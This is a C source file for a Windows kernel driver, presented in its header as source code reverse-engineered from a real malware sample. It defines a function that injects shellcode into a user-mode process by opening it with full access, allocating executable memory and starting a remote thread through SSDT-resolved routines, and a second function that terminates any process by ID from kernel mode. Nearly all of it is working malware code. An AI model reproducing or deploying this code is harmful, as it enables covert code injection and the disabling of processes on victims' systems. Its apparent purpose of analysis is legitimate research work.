/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "ProcessInjector.h"


NTSTATUS InjectShellcodeOnUsermodeProcess(
    
    _In_ SIZE_T szPid,
    _In_ PVOID pNtWriteSsdt,
    _In_ PVOID pZwCreateThreadExSsdt,
    _In_ unsigned char* chShellcode,
    _In_ ULONG ulShellcode

) {

    OBJECT_ATTRIBUTES objectAtributes = { 0 };
    CLIENT_ID clientId = { 0 };
    HANDLE hProcess = 0;
    HANDLE hThread = 0;

    objectAtributes.Length = 48;

    memset( _Out_ &objectAtributes.RootDirectory, _In_ 0, _In_ 20 );
    
    objectAtributes.SecurityDescriptor = NULL;
    
    objectAtributes.SecurityQualityOfService = NULL;

    clientId.UniqueProcess = ( HANDLE )szPid;
    
    clientId.UniqueThread = ( HANDLE )0;

    PVOID baseAddress = NULL;

    NTSTATUS ntStatus = ZwOpenProcess(
        
        _Out_ &hProcess,
        _In_ 0x1FFFFF,
        _In_ &objectAtributes,
        _In_opt_ &clientId
    
    );

    if ( NT_SUCCESS( ntStatus ) ) {

        SIZE_T szShellcode = ( ULONG )ulShellcode+1;

        ntStatus = ZwAllocateVirtualMemory(
            
            _In_ hProcess,
            _Inout_ &baseAddress,
            _In_ 0,
            _Inout_ &szShellcode,
            _In_ MEM_COMMIT | MEM_RESERVE,
            _In_ PAGE_EXECUTE_READWRITE
        
        );

        if ( NT_SUCCESS( ntStatus ) ) {

            NtWriteVirtualMemory = ( _NtWriteVirtualMemory )pNtWriteSsdt;

            ZwCreateThreadEx = ( _ZwCreateThreadEx )pZwCreateThreadExSsdt;

            if ( NtWriteVirtualMemory == NULL || !MmIsAddressValid(
                
                _In_ pNtWriteSsdt
            
            ) ) {

                ZwClose(
                    
                    _In_ hProcess
                
                );

                return STATUS_UNSUCCESSFUL;
            }

            ntStatus = NtWriteVirtualMemory(
                
                _In_ hProcess,
                _In_opt_ baseAddress,
                _In_ chShellcode,
                _In_ ulShellcode+1,
                _Out_opt_ NULL
            
            );

            ULONG_PTR ulBaseAddress = ( ULONG_PTR )baseAddress;

            ulBaseAddress += 0x2A;

            baseAddress = ( PVOID )ulBaseAddress;

            ntStatus = ZwCreateThreadEx(
                
                _Out_ &hThread,
                _In_ 0x1FFFFF,
                _In_ 0,
                _In_ hProcess,
                _In_ ( PUSER_THREAD_START_ROUTINE )baseAddress,
                _In_ 0,
                _In_ 0,
                _In_ 0,
                _In_ 0,
                _In_ 0,
                _In_ 0
            
            );

            ZwWaitForSingleObject(
                
                _In_ hThread,
                _In_ 0,
                _In_opt_ 0
            
            );

            ZwClose(
                
                _In_ &hThread
            
            );

            ZwClose(
                
                _In_ hProcess
            
            );

            DbgPrintEx(
                
                _In_ 0,
                _In_ 0,
                _In_ "Foi :)"
            
            );

            if ( NT_SUCCESS( ntStatus ) ) return STATUS_SUCCESS;
        }
        else DbgPrintEx(
            
            _In_ 0,
            _In_ 0,
            _In_ "Felicidade de pobre dura pouco viu..."
        
        );

    }

    return STATUS_INVALID_ADDRESS;
}


NTSTATUS TerminateUsemodeProcess(
    
    _In_ SIZE_T szPid

) {

    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

    HANDLE hProc = 0;

    CLIENT_ID clientID = { 0 };

    OBJECT_ATTRIBUTES objAttibutes = { 0 };

    objAttibutes.Length = 48;

    memset( _Out_ &objAttibutes.RootDirectory, _In_ 0, _In_ 20 );

    objAttibutes.SecurityDescriptor = 0;

    objAttibutes.SecurityQualityOfService = 0;

    clientID.UniqueProcess = ( HANDLE )szPid;
    clientID.UniqueThread = ( HANDLE )0;

    ntStatus = ZwOpenProcess(
        
        _Out_ &hProc,
        _In_ 0x1FFFFF,
        _In_ &objAttibutes,
        _In_opt_ &clientID
    
    );

    if ( NT_SUCCESS( ntStatus ) )
        return ZwTerminateProcess(
            
            _In_opt_ hProc,
            _In_ 0
        
        );

    return ntStatus;
}